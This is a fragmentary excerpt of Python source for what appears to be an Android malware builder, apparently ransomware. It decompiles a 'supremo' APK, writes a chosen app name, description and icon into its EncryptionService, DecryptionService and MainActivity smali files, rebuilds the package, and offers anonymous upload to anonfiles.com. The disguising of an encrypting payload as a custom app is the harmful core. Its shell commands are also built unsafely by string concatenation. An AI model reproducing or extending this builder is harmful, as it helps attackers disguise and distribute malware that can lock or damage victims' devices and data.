    ...
    def buildapk(self):
        try:
            ...
            if os.path.isfile("final.apk"):
                os.system("rm -rf supremo > /dev/null 2>&1")
...
{w}[{b}2{w}] anonfiles.com - anonymous file upload
    ...
    def builder(self,version):
        ...
        if version == 1:
            ...
            if os.path.isdir("supremo"):
                strings="supremo/res/values/strings.xml"
                print("I: Using strings: "+strings)
                smali=os.popen(f"find -L supremo/ -name '*0000.smali'","r").readline().strip()
                ...
                for path in imgv1:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            ...
                            logo = "supremo-"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf supremo > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} directory not found: {path}")
                self.buildapk()
            else: os.system("rm -rf supremo > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
        elif version == 2:
            while True:
                x=str(input(f"{b}>{w} SET APP_ICON ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
            ...
            if os.path.isdir("supremo"):
                ...
                print("I: Using strings: "+strings)
                self.write(strings,"AppName",self.AppName)
                self.write("supremo/smali/com/supremon9/services/EncryptionService.smali","AppName",self.AppName)
                self.write("supremo/smali/com/supremon9/services/DecryptionService.smali","AppName",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write("supremo/smali/com/supremon9/services/EncryptionService.smali","AppDesc",self.AppDesc)
                self.write("supremo/smali/com/supremon9/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
                self.write("supremo/smali/com/supremon9/ui/MainActivity.smali","AppDesc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv2:
